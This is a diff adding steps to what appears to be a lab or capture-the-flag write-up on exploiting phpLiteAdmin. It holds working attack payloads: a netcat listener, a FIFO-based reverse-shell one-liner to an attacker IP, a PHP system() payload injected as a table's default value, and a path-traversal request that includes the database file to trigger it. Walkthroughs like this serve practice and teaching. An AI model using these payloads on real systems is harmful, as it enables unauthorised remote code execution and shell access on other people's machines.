@@ -87,6 +87,12 @@ After achieving Remote Code Execution on the target via phpLiteAdmin, a reverse 
 A listener was set up on the attacker machine
 command: nc -lvnp 1234
 
+create new table and defaultValue use payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.128 1234 >/tmp/f;
+
+create table field=1 Type=TEXT DefaultValue = <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.128 1234 >/tmp/f;")?>
+
+refresh http://<ip>/view.php?page=../../usr/databases/ep5.php
+
 Since traditional Netcat variants were limited on the target, a named pipe (FIFO) based technique was used to stabilize the shell and redirect input/output streams. This allowed an interactive reverse shell connection back to the attacker machine.
 
 Once executed, the target system initiated a connection back to the attacker, resulting in successful shell access.
